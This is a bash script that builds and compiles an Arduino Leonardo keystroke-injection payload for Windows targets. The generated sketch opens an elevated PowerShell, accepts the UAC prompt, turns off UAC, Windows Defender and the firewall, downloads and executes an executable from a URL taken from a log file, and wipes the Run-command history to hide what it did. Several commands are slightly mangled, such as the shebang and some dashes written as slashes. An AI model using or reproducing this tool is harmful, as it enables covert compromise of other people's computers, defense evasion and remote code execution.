#/bin/bash

url=`cat logs/ssh.log | awk '{print $6}'`

echo "[INFO] Creating sketch"
arduino-cli sketch new ../blackbox > /dev/null
echo "[INFO] Installing platform"
arduino-cli core install arduino:avr > /dev/null
echo "[WARNING] Is your arduino connected? >> "
read arduino
if [[ $arduino == 'y' ]]; then
    echo "[INFO] OK..."
    echo "[WARNING] Uploading script..."
    # Arduino Script
    echo "#if ARDUINO > 10605" > blackbox/blackbox.ino
    echo "#include <Keyboard.h>" >> blackbox/blackbox.ino
    echo "#endif" >> blackbox/blackbox.ino

    echo "// Init function" >> blackbox/blackbox.ino
    echo "void setup() {" >> blackbox/blackbox.ino
    echo -e "\t// Beginning the stream" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.begin();" >> blackbox/blackbox.ino
    echo -e "\t// Waiting 1000ms for delay" >> blackbox/blackbox.ino
    echo -e "\tdelay(3000);" >> blackbox/blackbox.ino

    echo -e "\t// Deploy RUN with WINGUI" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_LEFT_GUI);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(114);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino
    echo -e "\tdelay(1000);" >> blackbox/blackbox.ino

    echo -e '\tKeyboard.print("powershell /command Set/WinUserLanguageList /Force en/US");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino
    
    echo -e "\t// Wait" >> blackbox/blackbox.ino
    echo -e "\tdelay(3000);" >> blackbox/blackbox.ino

    echo -e "\t// Deploy RUN with WINGUI" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_LEFT_GUI);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(114);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino
    echo -e "\tdelay(1000);" >> blackbox/blackbox.ino
    
    echo -e '\tKeyboard.print("powershell Start-Process powershell -Verb runAs");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino

    echo -e "\t// This delay lets slow/old computers execute the PowerShell properly" >> blackbox/blackbox.ino
    echo -e "\tdelay(2000);" >> blackbox/blackbox.ino

    echo -e "\t// Execute as Admin Accept" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_LEFT_ARROW);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino

    echo -e "\t// This delay lets slow/old computers execute the PowerShell properly"  >> blackbox/blackbox.ino
    echo -e "\tdelay(2000);" >> blackbox/blackbox.ino

    echo -e "\t// Disable UAC" >> blackbox/blackbox.ino
    echo -e '\tKeyboard.print("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\\\Software\\\\nMicrosoft\\\\nWindows\\\\nCurrentVersion\\\\nPolicies\\\\nSystem -Name ConsentPromptBehaviorAdmin -Value 0");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino

    echo -e "\t// Disable Windows Defender" >> blackbox/blackbox.ino
    echo -e '\tKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino
    echo -e '\tKeyboard.print("Set-MpPreference -SubmitSamplesConsent NeverSend");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino
    echo -e '\tKeyboard.print("Set-MpPreference -MAPSReporting Disable");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino
    
    echo -e "\t// Disable firewall" >> blackbox/blackbox.ino
    echo -e '\tKeyboard.print("Set-NetFirewallProfile -Enabled False");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino

    echo -e "\t// Modify 127.0.0.1 with your IP Address and payload.exe with your payload name" >> blackbox/blackbox.ino
    echo -e '\tKeyboard.print("$down = New-Object System.Net.WebClient; $url = '$url'; $file = 'bashbunny.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino

    echo -e "\t// Clean run command history" >> blackbox/blackbox.ino
    echo -e '\tKeyboard.print("reg delete HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RunMRU /va /f");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino

    echo -e "\t// Back to Spanish Keyboard Layout" >> blackbox/blackbox.ino
    echo -e '\tKeyboard.print("powershell -command Set-WinUserLanguageList -Force es-ES");' >> blackbox/blackbox.ino
    echo -e "\tKeyboard.press(KEY_RETURN);" >> blackbox/blackbox.ino
    echo -e "\tKeyboard.releaseAll();" >> blackbox/blackbox.ino

    echo -e '\tKeyboard.print("exit");' >> blackbox/blackbox.ino
    echo -e '\tKeyboard.press(KEY_RETURN);' >> blackbox/blackbox.ino
    echo -e '\tKeyboard.releaseAll();' >> blackbox/blackbox.ino
    echo -e '}' >> blackbox/blackbox.ino

    echo -e 'void loop() {}' >> blackbox/blackbox.ino
    
    echo "[WARNING] Compiling sketch..."
    arduino-cli compile -b arduino:avr:leonardo blackbox/blackbox.ino
    if [ $? -eq 0 ]; then
        echo "[INFO] Compiled successfully"
    else
        echo "[ERROR] Something went wrong"
    fi
else
    echo "[ERROR] Something went wrong..."
fi